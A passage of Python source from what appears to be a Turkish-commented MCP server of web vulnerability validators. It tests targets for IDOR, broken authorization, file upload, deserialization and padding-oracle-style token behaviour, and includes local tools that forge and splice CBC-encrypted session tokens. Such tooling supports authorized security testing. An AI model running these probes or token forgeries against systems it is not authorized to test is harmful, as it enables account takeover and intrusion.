    attacker_fp = _identity_fingerprint(atk_h)
    if owner_fp == attacker_fp:
        return _result("IDOR", object_url, ERROR, "content_match",
                       {"argument_error": "owner ve attacker kimlikleri farklı olmalı"}, "-",
                       notes="Owner ve attacker credential fingerprint'leri aynı.",
                       guard={"transport_ok": False,
                              "prerequisites": ["distinct owner and attacker identities"]})
    owner = _request("GET", object_url, headers=owner_h, allow_redirects=False, observe_session=False)
    if not owner.get("ok") or owner.get("status") not in (200, 206):
        return _result("IDOR", object_url, INCONCLUSIVE, "content_match",
                       {"owner_status": owner.get("status")}, "-",
                       notes="Sahip isteği 200 dönmedi — geçerli owner kimliği ver.",
                       guard={"transport_ok": bool(owner.get("ok"))},
                       request_evidence=[response_evidence(owner, "owner", 0)])
    if owner_marker and owner_marker not in owner.get("text", ""):
        return _result(
            "IDOR", object_url, INCONCLUSIVE, "content_match",
            {"owner_status": owner.get("status"), "owner_marker_in_owner_response": False}, "-",
            notes="Verilen owner_marker owner yanıtında bulunamadı.",
            guard={"prerequisites": ["owner response contains owner-specific marker"],
                   "transport_ok": True},
            request_evidence=[response_evidence(owner, "owner", 0)],
        )
    atk = _request("GET", object_url, headers=atk_h, allow_redirects=False, observe_session=False)
    if not atk.get("ok") or atk.get("status") is None:
        return _result("IDOR", object_url, INCONCLUSIVE, "content_match",
                       {"owner_status": owner.get("status"), "attacker_status": atk.get("status")}, "-",
                       notes="İkinci kimliğin isteği tamamlanmadı; erişim kararı verilemez.",
                       guard={"transport_ok": False, "prerequisites": ["successful attacker transport"]},
                       request_evidence=[response_evidence(owner, "owner", 0),
                                         response_evidence(atk, "attacker", 0)])
    sim = _similar(owner, atk)
    marker_in_attacker = bool(owner_marker and owner_marker in atk.get("text", ""))
    if atk.get("ok") and atk.get("status") in (200, 206) and marker_in_attacker:
        anon_h = _anonymous_headers(owner_h)
        anon = _request("GET", object_url, headers=anon_h, allow_redirects=False, observe_session=False)
        anon_status = anon.get("status")
        if (not anon.get("ok") or anon_status is None or anon_status == 429
                or anon_status >= 500):
            return _result(
                "IDOR", object_url, INCONCLUSIVE, "content_match",
                {"owner_status": owner["status"], "attacker_status": atk["status"],
                 "anonymous_status": anon_status}, "-",
                notes="Anonim kontrol tamamlanamadı; erişim kararını doğrulamak için başarılı baseline gerekir.",
                guard={"transport_ok": bool(anon.get("ok")),
                       "controls": ["attacker request", "anonymous baseline request"]},
                request_evidence=[response_evidence(owner, "owner", 0),
                                  response_evidence(atk, "attacker", 0),
                                  response_evidence(anon, "anonymous", 0)],
            )
        marker_in_anon = bool(anon.get("ok") and anon.get("status") in (200, 206)
                              and owner_marker in anon.get("text", ""))
        evidence = {"owner_status": owner["status"], "attacker_status": atk["status"],
                    "content_similarity": sim,
                    "owner_marker_sha256": hashlib.sha256(owner_marker.encode()).hexdigest(),
                    "owner_marker_in_attacker_response": True,
                    "identity_fingerprints_distinct": True,
                    "anonymous_status": anon.get("status"),
                    "owner_marker_in_anonymous_response": marker_in_anon}
        notes = "Farklı kimlik, owner yanıtında doğrulanan owner-specific marker'ı aldı."
        if marker_in_anon:
            notes += " Anonim istek de marker'ı aldı → nesne herkese açık (IDOR + unauth)."
        return _result("Insecure Direct Object Reference (IDOR)", object_url, CONFIRMED,
                       "content_match",
                       evidence,
                       [_curl("GET", object_url, headers=owner_h),
                         _curl("GET", object_url, headers=atk_h),
                         _curl("GET", object_url, headers=anon_h)],
                       notes=notes,
                       guard={
                           "prerequisites": ["distinct identities", "owner marker in owner response"],
                           "controls": ["attacker request", "anonymous baseline request",
                                        "owner marker comparison"],
                           "transport_ok": True,
                           "decision_rule": "attacker response must contain owner-specific marker",
                       },
                       request_evidence=[response_evidence(owner, "owner", 0),
                                         response_evidence(atk, "attacker", 0),
                                         response_evidence(anon, "anonymous", 0)])
    if atk.get("ok") and atk.get("status") in (200, 206) and sim >= 0.92 and not owner_marker:
        return _result(
            "IDOR candidate", object_url, INCONCLUSIVE, "content_match",
            {"owner_status": owner["status"], "attacker_status": atk["status"],
             "content_similarity": sim, "primitive_detected": "same_object_response"},
            [_curl("GET", object_url, headers=owner_h),
             _curl("GET", object_url, headers=atk_h)],
            notes="İki kimlik aynı yanıtı aldı ancak owner-specific marker verilmedi; public nesne ayrıştırılamaz.",
            guard={
                "prerequisites": ["owner-specific marker"],
                "controls": ["distinct identity fingerprints"],
                "transport_ok": True,
                "limitations": ["owner_marker is required for CONFIRMED"],
            },
        )
    return _result("Insecure Direct Object Reference (IDOR)", object_url, UNCONFIRMED,
                   "content_match",
                   {"attacker_status": atk.get("status"), "content_similarity": sim,
                    "owner_marker_in_attacker_response": marker_in_attacker},
                   "-", notes="Saldırgan kimliği sahibin verisine erişemedi (beklenen).",
                   guard={"transport_ok": True, "prerequisites": ["distinct identities"],
                          "controls": ["owner response", "attacker response"]},
                   request_evidence=[response_evidence(owner, "owner", 0),
                                     response_evidence(atk, "attacker", 0)])


def _validate_bfla_readonly(protected_url: str, owner_headers_json: str,
                            other_headers_json: str, protected_marker: str) -> str:
    """Compare explicitly identified roles on one owned, read-only resource."""
    owner_h, owner_error = _strict_identity_headers(owner_headers_json)
    other_h, other_error = _strict_identity_headers(other_headers_json)
    if (owner_error or other_error or not protected_marker
            or _identity_fingerprint(owner_h) == _identity_fingerprint(other_h)):
        return _result("bfla", protected_url, INCONCLUSIVE, "content_match",
                       {"error": "distinct identities and a protected marker are required"}, "-",
                       guard={"transport_ok": False})
    owner = _request("GET", protected_url, headers=owner_h, allow_redirects=False, observe_session=False)
    if not owner.get("ok") or owner.get("status") not in (200, 206) or protected_marker not in owner.get("text", ""):
        return _result("bfla", protected_url, INCONCLUSIVE, "content_match",
                       {"owner_status": owner.get("status")}, "-",
                       guard={"transport_ok": bool(owner.get("ok"))},
                       request_evidence=[response_evidence(owner, "owner", 0)])
    other = _request("GET", protected_url, headers=other_h, allow_redirects=False, observe_session=False)
    controls = [response_evidence(owner, "owner", 0), response_evidence(other, "other", 0)]
    if not other.get("ok") or other.get("status") not in (200, 206, 403):
        return _result("bfla", protected_url, INCONCLUSIVE, "content_match",
                       {"other_status": other.get("status")}, "-",
                       guard={"transport_ok": False}, request_evidence=controls)
    marker_seen = other.get("status") in (200, 206) and protected_marker in other.get("text", "")
    if marker_seen:
        anon_h = _anonymous_headers(owner_h)
        anonymous = _request("GET", protected_url, headers=anon_h, allow_redirects=False, observe_session=False)
        controls.append(response_evidence(anonymous, "anonymous", 0))
        if (not anonymous.get("ok") or anonymous.get("status") not in (200, 206, 401, 403)
                or protected_marker in anonymous.get("text", "")):
            return _result("bfla", protected_url, INCONCLUSIVE, "content_match",
                           {"other_status": other.get("status"), "anonymous_status": anonymous.get("status")},
                           "-", notes="Anonymous baseline cannot establish a protected function.",
                           guard={"transport_ok": bool(anonymous.get("ok"))}, request_evidence=controls)
        return _result("bfla", protected_url, CONFIRMED, "content_match",
                       {"owner_status": owner.get("status"), "other_status": other.get("status"),
                        "anonymous_status": anonymous.get("status"),
                        "protected_marker_sha256": hashlib.sha256(protected_marker.encode()).hexdigest()},
                       [_curl("GET", protected_url, headers=owner_h), _curl("GET", protected_url, headers=other_h)],
                       guard={"transport_ok": True, "controls": ["owner", "other role", "anonymous"]},
                       request_evidence=controls)
    return _result("bfla", protected_url, UNCONFIRMED, "content_match",
                   {"owner_status": owner.get("status"), "other_status": other.get("status")}, "-",
                   guard={"transport_ok": True, "controls": ["owner", "other role"]},
                   request_evidence=controls)


@mcp.tool()
def validate_file_upload(upload_url: str, param: str = "file", fetch_base: str = "",
                         headers_json: str = "{}") -> str:
    """Dosya yukleme kabulunu marker-oracle ile dogrula (deterministik).

    Zararsiz marker dosyasi yuklenir; marker kimliksiz erisilebilir olursa
    CONFIRMED. Kabul edilip erisilemezse INCONCLUSIVE, reddedilirse UNCONFIRMED.

    Args:
        upload_url: Multipart POST kabul eden endpoint
        param: Dosya alaninin adi (form field)
        fetch_base: Yuklenen dosyalarin sunuldugu kok URL (opsiyonel)
        headers_json: Yukleme icin ek basliklar (JSON; erisim kontrolunde kullanilmaz)
    """
    H = _headers(headers_json)
    token = secrets.token_hex(8)
    marker = f"CCO-UPLOAD-{token}"
    attempts = [
        (f"cco-{token}.txt", f"{marker}\n", "text/plain"),
        (f"cco-{token}.html", f"<!-- {marker} -->\n", "text/html"),
        (f"cco-{token}.svg",
         f'<svg xmlns="http://www.w3.org/2000/svg"><text>{marker}</text></svg>', "image/svg+xml"),
    ]
    accepted: list[dict] = []
    for filename, content, ctype in attempts:
        boundary = f"----cco{token}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{param}"; filename="{filename}"\r\n'
            f"Content-Type: {ctype}\r\n\r\n{content}\r\n--{boundary}--\r\n"
        ).encode()
        hdrs = dict(H)
        hdrs["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        up = _request("POST", upload_url, data=body, headers=hdrs, allow_redirects=False)
        if not (up.get("ok") and isinstance(up.get("status"), int) and 200 <= up["status"] < 300):
            continue
        candidates: list[str] = []
        text = up.get("text") or ""
        try:
            parsed = json.loads(text)
            if isinstance(parsed, dict):
                for key in ("url", "path", "location", "file", "href"):
                    val = parsed.get(key)
                    if isinstance(val, str) and val:
                        candidates.append(urljoin(upload_url, val))
        except Exception:
            pass
        for match in re.findall(r"https?://[^\s\"'<>]+", text):
            if token in match:
                candidates.append(match)
        if fetch_base:
            candidates.append(urljoin(fetch_base.rstrip("/") + "/", filename))
        candidates.append(urljoin(upload_url, f"uploads/{filename}"))
        candidates.append(urljoin(upload_url, filename))
        seen: set[str] = set()
        for cand in candidates:
            if cand in seen:
                continue
            seen.add(cand)
            got = _request("GET", cand, headers={"User-Agent": UA}, allow_redirects=True)
            if got.get("ok") and got.get("status") == 200 and marker in (got.get("text") or ""):
                served = (got.get("headers") or {}).get("Content-Type", "")
                return _result(
                    "Unrestricted File Upload", upload_url, CONFIRMED, "content_match",
                    {"filename": filename, "fetch_url": cand,
                     "served_content_type": served, "public_fetch": True},
                    _curl("POST", upload_url, headers=H),
                    notes="Yuklenen marker dosyasi kimliksiz geri okunabildi.",
                    guard={"prerequisites": ["multipart upload endpoint"],
                           "controls": ["random marker", "unauthenticated fetch-back"],
                           "transport_ok": True,
                           "decision_rule": "uploaded marker must be publicly retrievable"})
        accepted.append({"filename": filename, "status": up.get("status")})
    if accepted:
        return _result("Unrestricted File Upload", upload_url, INCONCLUSIVE, "content_match",
                       {"accepted": accepted}, _curl("POST", upload_url, headers=H),
                       notes="Yukleme kabul edildi ancak marker geri okunamadi; "
                             "fetch_base ile tekrar deneyin.")
    return _result("Unrestricted File Upload", upload_url, UNCONFIRMED, "content_match",
                   {"attempts": len(attempts)}, "-",
                   notes="Hicbir marker yuklemesi 2xx ile kabul edilmedi.")


@mcp.tool()
def validate_deserialization(target_url: str, sample_value: str, carrier: str = "cookie",
                             name: str = "session", headers_json: str = "{}") -> str:
    """Serileştirilmiş taşıyıcıyı üçlü farksal oracle ile doğrula (Java/PHP/pickle).

    Baz (geçerli örnek) kabul + bozuk akış 5xx + taşıyıcısız istek farklı
    davranıyorsa sunucu serileştirilmiş girdiyi işliyor demektir: CONFIRMED.

    Args:
        target_url: Taşıyıcıyı tüketen endpoint (ör. /my-account)
        sample_value: Yakalanan taşıyıcı değeri (Base64/URL kodlu serileştirilmiş akış)
        carrier: cookie | param | body
        name: Cookie/param adı
        headers_json: Ek başlıklar (JSON)
    """
    import base64 as _b64

    from cco_validator_core.deser import decode_sample, detect_format, java_class_name

    raw = decode_sample(sample_value)
    fmt = detect_format(raw)
    base_headers = _headers(headers_json)
    if fmt == "unknown":
        return _result("Insecure Deserialization", target_url, UNCONFIRMED,
                       "differential_deserialization",
                       {"format": fmt, "sample_len": len(raw)}, "-",
                       notes="Örnek tanınan bir serileştirme biçimi değil.")
    if fmt == "dotnet":
        return _result("Insecure Deserialization", target_url, INCONCLUSIVE,
                       "differential_deserialization",
                       {"format": fmt, "sample_len": len(raw)}, "-",
                       notes=".NET biçimi tespit edildi; akış yapısı belirsiz, oracle kapsam dışı.")

    def _send(value: str | None):
        hdrs = dict(base_headers)
        params = None
        data = None
        method = "GET"
        if value is not None:
            if carrier == "cookie":
                prev = hdrs.get("Cookie", "")
                hdrs["Cookie"] = f"{prev}; {name}={value}" if prev else f"{name}={value}"
            elif carrier == "param":
                params = {name: value}
            else:
                method, data = "POST", value
        return _request(method, target_url, params=params, data=data, headers=hdrs)

    corrupted_raw = bytearray(raw)
    if len(corrupted_raw) > 12:
        corrupted_raw[len(corrupted_raw) // 2] ^= 0xFF
    corrupted_value = _b64.b64encode(bytes(corrupted_raw)).decode()

    baseline = _send(sample_value)
    corrupted = _send(corrupted_value)
    absent = _send(None)

    def _status(resp):
        return resp.get("status") if resp.get("ok") else None

    accepted = baseline.get("ok") and isinstance(_status(baseline), int) and _status(baseline) < 500
    corrupt_rejected = (not corrupted.get("ok")) or (isinstance(_status(corrupted), int) and _status(corrupted) >= 500)
    absent_differs = _status(absent) != _status(baseline) or abs(
        int(absent.get("len") or 0) - int(baseline.get("len") or 0)) > 64
    evidence = {
        "format": fmt,
        "class_name": java_class_name(raw),
        "baseline_status": _status(baseline),
        "corrupted_status": _status(corrupted),
        "absent_status": _status(absent),
        "carrier": f"{carrier}:{name}",
    }
    if accepted and corrupt_rejected and absent_differs:
        return _result("Insecure Deserialization", target_url, CONFIRMED,
                       "differential_deserialization", evidence,
                       _curl("GET", target_url, headers=base_headers),
                       notes="Sunucu serileştirilmiş taşıyıcıyı işliyor: geçerli akış "
                             "kabul, bozuk akış 5xx, taşıyıcısız istek farklı.")
    if accepted and not corrupt_rejected:
        return _result("Insecure Deserialization", target_url, INCONCLUSIVE,
                       "differential_deserialization", evidence, "-",
                       notes="Bozuk akış da kabul ediliyor; taşıyıcı yok sayılıyor olabilir.")
    return _result("Insecure Deserialization", target_url, UNCONFIRMED,
                   "differential_deserialization", evidence, "-",
                   notes="Örnek kabul edilmedi; kimlik bağlamı (headers_json) gerekli olabilir.")


# ─────────────────── Padding oracle + CBC dovme (Faz G) ───────────────────
@mcp.tool()
def validate_token_differential(target_url: str, sample_value: str, carrier: str = "cookie",
                            name: str = "session", headers_json: str = "{}") -> str:
    """Sifreli tasiyicida kontrollu farksal kume'i kontrollu farksal kume ile dogrula.

    Kume (hepsi ayni endpoint'e, kimlikli baglamla):
      baseline  — yakalanan gecerli ornek (kabul beklenir)
      flip      — ortada 1 bit cevrilmis, iyi-yapili varyant
      truncate  — blok hizasi bozulmus ama alfabesi gecerli varyant
      malformed — Base64 disi kontrol (decode-hatasi yolu; oracle disi)
      absent    — tasiyicisiz istek

    HUKUM (lab dersi: decode-hatasi 500 != dolgu-hatasi sinyali):
      CONFIRMED yalnizca baseline kabul + iyi-yapili varyantlar
      HEM hata (5xx) HEM hatasiz-farkli (baseline disi 2xx/3xx) uretirse.
      Tum iyi-yapili varyantlar tek kume verirse UNCONFIRMED.

    Args:
        target_url: Tasiyiciyi tuketen endpoint (orn /my-account)
        sample_value: Yakalanan tasiyici degeri (Base64/URL kodlu)
        carrier: cookie | param | body
        name: Cookie/param adi
        headers_json: Ek basliklar (kimlik dahil, JSON)
    """
    from cco_validator_core.crypto_token import (
        decode_token_sample, is_wellformed_token_text, token_structure)

    raw = decode_token_sample(sample_value)
    struct = token_structure(raw)
    if not raw:
        return _result("Token Differential (Opaque Carrier)", target_url, UNCONFIRMED,
                       "token_differential", {"structure": struct}, "-",
                       notes="Ornek bos ya da cozulemedi.")
    base_headers = _headers(headers_json)

    def _send(value: str | None):
        hdrs = dict(base_headers)
        params = None
        data = None
        method = "GET"
        if value is not None:
            if carrier == "cookie":
                prev = hdrs.get("Cookie", "")
                hdrs["Cookie"] = f"{prev}; {name}={value}" if prev else f"{name}={value}"
            elif carrier == "param":
                params = {name: value}
            else:
                method, data = "POST", value
        return _request(method, target_url, params=params, data=data, headers=hdrs)

    flips = bytearray(raw)
    flips[len(flips) // 2] ^= 0x01
    import base64 as _b64
    flip_value = _b64.b64encode(bytes(flips)).decode()
    trunc_value = _b64.b64encode(raw[:max(1, len(raw) - 5)]).decode()
    malformed_value = "!!!not-a-token!!!"

    variants = {
        "baseline": sample_value,
        "flip": flip_value,
        "truncate": trunc_value,
        "malformed": malformed_value,
    }
    wellformed = {k: is_wellformed_token_text(v) for k, v in variants.items()}
    assert wellformed["baseline"] and wellformed["flip"] and wellformed["truncate"]
    assert not wellformed["malformed"]

    resps = {"absent": _send(None)}
    resps.update({k: _send(v) for k, v in variants.items()})

    def _status(resp):
        return resp.get("status") if resp.get("ok") else None

    baseline = resps["baseline"]
    accepted = baseline.get("ok") and isinstance(_status(baseline), int) and _status(baseline) < 500
    evidence = {
        "structure": struct,
        "baseline_status": _status(baseline),
        "flip_status": _status(resps["flip"]),
        "truncate_status": _status(resps["truncate"]),
        "malformed_status": _status(resps["malformed"]),
        "absent_status": _status(resps["absent"]),
        "carrier": f"{carrier}:{name}",
        "note": "malformed kontrolu oracle kumesi disidir (decode-hatasi yolu).",
    }
    if not accepted:
        return _result("Token Differential (Opaque Carrier)", target_url, UNCONFIRMED,
                       "token_differential", evidence, "-",
                       notes="Ornek kabul edilmedi; kimlik baglami (headers_json) gerekli olabilir.")
    wf_statuses = {_status(resps["flip"]), _status(resps["truncate"])}
    wf_statuses.discard(None)
    base_status = _status(baseline)
    has_error_group = any(isinstance(s, int) and s >= 500 for s in wf_statuses)
    has_distinct_group = any(isinstance(s, int) and s < 500 and s != base_status
                             for s in wf_statuses)
    if has_error_group and has_distinct_group:
        return _result("Token Differential (Opaque Carrier)", target_url, CONFIRMED,
                       "token_differential", evidence,
                       _curl("GET", target_url, headers=base_headers),
                       notes="Sifre-coz gecerliligi disaridan ayirt ediliyor: iyi-yapili "
                             "varyantlar hem hata hem hatasiz-farkli uretiyor.")
    return _result("Token Differential (Opaque Carrier)", target_url, UNCONFIRMED,
                   "token_differential", evidence, "-",
                   notes="Iyi-yapili varyantlar tek kumede toplandi; dolgu gecerliligi "
                         "gozlemlenemiyor (cozum basarisizligi ile kimlik reddi ayirt "
                         "edilemiyor).")


@mcp.tool()
def forge_cbc_token(sample_value: str, known_plaintext_hex: str,
                    target_plaintext_hex: str) -> str:
    """CBC IV-dovme: ayni sifre blogu icin hedef duz-metne yeni IV uret (yerel).

    P' = Dec(C) XOR IV' esitliginden IV' = IV XOR P_bilinen XOR P_hedef.
    Ag trafigi yok; cikti tasiyici metni (URL kodlu Base64) + yapisal kanit.
    Uzunluklar esit olmali (tek blok); degilse ERROR doner.

    Args:
        sample_value: Yakalanan tasiyici degeri (base64(IV||C), tek blok)
        known_plaintext_hex: Bilinen duz-metin (hex; orn kendi girisimiz)
        target_plaintext_hex: Hedef duz-metin (hex; ayni uzunlukta)
    """
    from cco_validator_core.crypto_token import (
        decode_token_sample, encode_token_value, forge_cbc_iv, token_structure)

    try:
        known_pt = bytes.fromhex(known_plaintext_hex)
        target_pt = bytes.fromhex(target_plaintext_hex)
    except ValueError:
        return json.dumps({"verdict": ERROR, "tool": "forge_cbc_token",
                           "error": "Hex cozulemedi."}, ensure_ascii=False)
    raw = decode_token_sample(sample_value)
    half = len(raw) // 2
    if len(raw) < 32 or len(raw) % 2 != 0:
        return json.dumps({"verdict": ERROR, "tool": "forge_cbc_token",
                           "error": "Ornek cift-blok IV||C yapisinda degil "
                                    f"(len={len(raw)})."}, ensure_ascii=False)
    iv, ct = raw[:half], raw[half:]
    if not (len(iv) == len(known_pt) == len(target_pt)):
        return json.dumps({"verdict": ERROR, "tool": "forge_cbc_token",
                           "error": "IV/duz-metin uzunluklari esit olmali "
                                    f"(iv={len(iv)}, known={len(known_pt)}, "
                                    f"target={len(target_pt)})."}, ensure_ascii=False)
    try:
        new_iv = forge_cbc_iv(iv, known_pt, target_pt)
    except ValueError as e:
        return json.dumps({"verdict": ERROR, "tool": "forge_cbc_token",
                           "error": str(e)}, ensure_ascii=False)
    forged = encode_token_value(new_iv + ct)
    prop = bytes(a ^ b for a, b in zip(new_iv, iv))
    expect = bytes(a ^ b for a, b in zip(known_pt, target_pt))
    evidence = {
        "structure": token_structure(raw),
        "iv_xor_property_holds": prop == expect,
        "forged_length_chars": len(forged),
    }
    return json.dumps({"verdict": "FORGED", "tool": "forge_cbc_token",
                       "forged_token": forged, "evidence": evidence,
                       "notes": "Ag trafigi yok; dovme tasiyiciyi hedef endpointte "
                                "dene (200 + kimlik gostergesi = CONFIRMED bacak)."},
                      indent=2, ensure_ascii=False)


@mcp.tool()
def splice_cbc_token(sample_value: str, drop_bytes: int, block: int = 16) -> str:
    """CBC blok birlestirme: sifreli metnin basindan blok-hizali kesit at (yerel).

    Cozum-oracle'i one ek iceriyorsa: once dovme girdiyi one-uzunlugu blok
    katina tamamlayacak kadar doldurup sifrelet (orn 23 bayt onek -> 9 bayt
    dolgu + hedef = 32 bayt one blok), sonra bu arac ile o bloklari at.
    Ag trafigi yok; cikti tasiyici metni + yapisal kanit.

    Args:
        sample_value: Sifrelenmis tasiyici degeri (Base64/URL kodlu)
        drop_bytes: Bastan atilacak bayt (blok kati olmali)
        block: Blok uzunlugu (varsayilan 16)
    """
    from cco_validator_core.crypto_token import (
        cut_leading_bytes, decode_token_sample, encode_token_value,
        token_structure)

    raw = decode_token_sample(sample_value)
    if not raw:
        return json.dumps({"verdict": ERROR, "tool": "splice_cbc_token",
                           "error": "Ornek bos ya da cozulemedi."},
                          ensure_ascii=False)
    try:
        cut = cut_leading_bytes(raw, int(drop_bytes), int(block))
    except ValueError as e:
        return json.dumps({"verdict": ERROR, "tool": "splice_cbc_token",
                           "error": str(e)}, ensure_ascii=False)
    spliced = encode_token_value(cut)
    evidence = {
        "structure_before": token_structure(raw),
        "structure_after": token_structure(cut),
        "dropped_bytes": int(drop_bytes),
        "spliced_length_chars": len(spliced),
    }
    return json.dumps({"verdict": "SPLICED", "tool": "splice_cbc_token",
                       "spliced_token": spliced, "evidence": evidence,
                       "notes": "Ag trafigi yok; birlestirilmis tasiyiciyi coz "
                                "akisinde dene (oneksiz duz-metin = basari)."},
                      indent=2, ensure_ascii=False)


@mcp.tool()
def validate_token_roundtrip(encrypt_url: str, decrypt_url: str, field: str = "email",
                            cookie_name: str = "notification", method: str = "POST",
                            headers_json: str = "{}", extra_fields_json: str = "{}",
                            csrf_url: str = "", csrf_field: str = "csrf",
                            session_check_url: str = "",
                            session_marker: str = "") -> str:
    """Uygulama-akisi sifreleme oracle'i: secilmis-duz-metin sifrele + geri coz.

    Jenerik akis (lab-ozel varsayim yok):
      sifrele: method encrypt_url (alan=field, deger=kanarya) ->
               Set-Cookie cookie_name yakala (C_A, C_B)
      coz:     decrypt_url tasiyicida C_A ile -> yanit kanaryayi yansitiyor mu?

    HUKUM: C_A ile C_B farkli + cozum yaniti kanarya A'yi iceriyor
      (donus-turu calisiyor) ise CONFIRMED. Sifre metinler ham
      saklanmaz/raporlanmaz (sha256 ozeti + uzunluk).

    Args:
        encrypt_url: Kanaryayi sifreleyen endpoint (orn yorum formu POST'u)
        decrypt_url: Tasiyiciyi cozup gozlemlenebilir cikti ureten endpoint
        field: Sifrelenen form alani
        cookie_name: Sifreli metni tasiyan cookie adi
        method: Sifrele istegi yontemi (POST/GET)
        headers_json: Ek basliklar (kimlik dahil, JSON)
        extra_fields_json: Sifrele istegine eklenecek sabit alanlar (JSON)
        csrf_url: Her sifrele POST'u oncesi taze token alinacak form URL'si
            (bos = kapali; tek-kullanimlik CSRF akislari icin sart)
        csrf_field: CSRF alan adi
        session_check_url: Olcu oncesi oturum gecerlilik probu URL'si
            (bos = kapali)
        session_marker: Oturum gecerliyse yanitta bulunmasi gereken isaret
            (orn kullanici adi); yoksa INCONCLUSIVE (olu oturum)
    """
    import hashlib as _hl
    import re as _re

    try:
        extra = json.loads(extra_fields_json) if extra_fields_json else {}
        if not isinstance(extra, dict):
            extra = {}
    except Exception:
        extra = {}
    base_headers = _headers(headers_json)
    if session_check_url and session_marker:
        probe = _request("GET", session_check_url, headers=dict(base_headers))
        if session_marker not in (probe.get("text") or ""):
            return _result("Token Round-Trip (Application Flow)", encrypt_url,
                           INCONCLUSIVE, "token_roundtrip",
                           {"session_check_url": session_check_url,
                            "session_check_status": probe.get("status") if probe.get("ok") else None}, "-",
                           notes="Oturum gostergesi yok (olu oturum?); olcu yapilmadi.")
    canary_a = "cco-oracle-probe-aaa-001"
    canary_b = "cco-oracle-probe-bbb-002"

    def _fresh_csrf():
        if not csrf_url:
            return ""
        try:
            page = _request("GET", csrf_url, headers=dict(base_headers))
            html = page.get("text") or ""
            m = re.search(r"name=[\"']" + re.escape(csrf_field) +
                          r"[\"']\s+value=[\"']([^\"']+)[\"']", html)
            if not m:
                m = re.search(r"value=[\"']([^\"']+)[\"']\s+name=[\"']" +
                              re.escape(csrf_field) + r"[\"']", html)
            return m.group(1) if m else ""
        except Exception:
            return ""

    def _enc(canary: str):
        hdrs = dict(base_headers)
        data = dict(extra)
        data[field] = canary
        if csrf_url:
            token = _fresh_csrf()
            if token:
                data[csrf_field] = token
        # Carrier Set-Cookie is issued on the immediate (pre-redirect) response;
        # following the 302 would make the target consume/clear it before capture.
        if method.upper() == "GET":
            return _request("GET", encrypt_url, params=data, headers=hdrs,
                            allow_redirects=False)
        return _request("POST", encrypt_url, data=data, headers=hdrs,
                        allow_redirects=False)

    def _cookie_value(resp) -> str:
        hdrs = resp.get("headers") or {}
        chunks = []
        for k, v in hdrs.items():
            if str(k).lower() != "set-cookie":
                continue
            vals = v if isinstance(v, (list, tuple)) else [v]
            chunks.extend(str(x) for x in vals)
        blob = "\n".join(chunks)
        m = _re.search(r"(?:^|\n)\s*" + _re.escape(cookie_name) + r"\s*=\s*([^;\n]+)",
                       blob)
        return (m.group(1).strip() if m else "")

    enc_a = _enc(canary_a)
    enc_b = _enc(canary_b)
    c_a, c_b = _cookie_value(enc_a), _cookie_value(enc_b)

    def _digest(s: str) -> str:
        return _hl.sha256(s.encode()).hexdigest() if s else ""

    evidence = {
        "encrypt_url": encrypt_url,
        "decrypt_url": decrypt_url,
        "field": field,
        "cookie": cookie_name,
        "cipher_a_sha256": _digest(c_a),
        "cipher_b_sha256": _digest(c_b),
        "cipher_a_len": len(c_a),
        "cipher_b_len": len(c_b),
        "enc_a_status": enc_a.get("status") if enc_a.get("ok") else None,
        "enc_b_status": enc_b.get("status") if enc_b.get("ok") else None,
    }
    if not c_a or not c_b:
        return _result("Token Round-Trip (Application Flow)", encrypt_url, UNCONFIRMED,
                       "token_roundtrip", evidence, "-",
                       notes="Sifrele adimi tasiyici uretmedi; alan/cookie adi "
                             "veya akis farkli olabilir.")
    evidence["ciphers_differ"] = c_a != c_b
    if c_a == c_b:
        return _result("Token Round-Trip (Application Flow)", encrypt_url, UNCONFIRMED,
                       "token_roundtrip", evidence, "-",
                       notes="Farkli girdiler ayni sifreli metni uretti; secilmis-duz-metin "
                             "sifreleme gozlemlenemedi.")

    dec_headers = dict(base_headers)
    prev = dec_headers.get("Cookie", "")
    dec_headers["Cookie"] = f"{prev}; {cookie_name}={c_a}" if prev else f"{cookie_name}={c_a}"
    dec = _request("GET", decrypt_url, headers=dec_headers)
    body = dec.get("text") or ""
    reflected = canary_a in body
    evidence["decrypt_status"] = dec.get("status") if dec.get("ok") else None
    evidence["canary_reflected"] = reflected
    evidence["decrypt_body_len"] = dec.get("len")
    if reflected:
        return _result("Token Round-Trip (Application Flow)", encrypt_url, CONFIRMED,
                       "token_roundtrip", evidence,
                       _curl("GET", decrypt_url, headers=dec_headers),
                       notes="Donus-turu calisiyor: secilmis girdi sifrelendi, sifreli "
                             "metin cozumle gozlemlenebilir cikti uretti.")
    return _result("Token Round-Trip (Application Flow)", encrypt_url, UNCONFIRMED,
                   "token_roundtrip", evidence, "-",
                   notes="Sifreleme gozlemlendi ama cozum yansimasi yok; cozum akisi "
                         "farkli tasiyici/endpoint gerektiriyor olabilir.")


# ─────────────────────────── Dispatcher + Rapor ───────────────────────────
_DISPATCH = {
    "sqli": validate_sqli, "sql injection": validate_sqli, "sql": validate_sqli, "sql_injection": validate_sqli,
    "ssti": validate_ssti, "template injection": validate_ssti,
    "command injection": validate_command_injection, "cmdi": validate_command_injection, "command_injection": validate_command_injection,
    "rce": validate_command_injection, "os command injection": validate_command_injection,
    "lfi": validate_path_traversal, "path traversal": validate_path_traversal, "path_traversal": validate_path_traversal,
    "file inclusion": validate_path_traversal, "directory traversal": validate_path_traversal,
    "xss": validate_xss_reflection, "cross-site scripting": validate_xss_reflection, "xss_reflected": validate_xss_reflection,
    "open redirect": validate_open_redirect, "redirect": validate_open_redirect, "open_redirect": validate_open_redirect,
    "xxe": validate_xxe,
    "auth bypass": validate_auth_bypass, "authentication bypass": validate_auth_bypass, "authentication_bypass": validate_auth_bypass,
    "authorization": validate_auth_bypass, "bfla": validate_auth_bypass, "broken_access_control": validate_auth_bypass,
    "idor": validate_idor, "bola": validate_idor,
    "ssrf": validate_ssrf_oob, "ssrf_oob": validate_ssrf_oob,
    "blind_oob": validate_blind_oob, "blind oob": validate_blind_oob,
    "csrf": validate_csrf, "cross-site request forgery": validate_csrf,
    "second_order": validate_second_order, "second order": validate_second_order,
    "stored": validate_second_order, "stored_xss": validate_second_order, "stored xss": validate_second_order,
    "file upload": validate_file_upload, "upload": validate_file_upload, "file_upload": validate_file_upload,
    "deserialization": validate_deserialization,
    "java deserialization": validate_deserialization,
    "insecure deserialization": validate_deserialization,
    "token differential": validate_token_differential,
    "token_differential": validate_token_differential,
    "opaque_token": validate_token_differential,
    "padding oracle": validate_token_differential,
    "padding_oracle": validate_token_differential,
    "encrypted token": validate_token_differential,
    "crypto token": validate_token_differential,
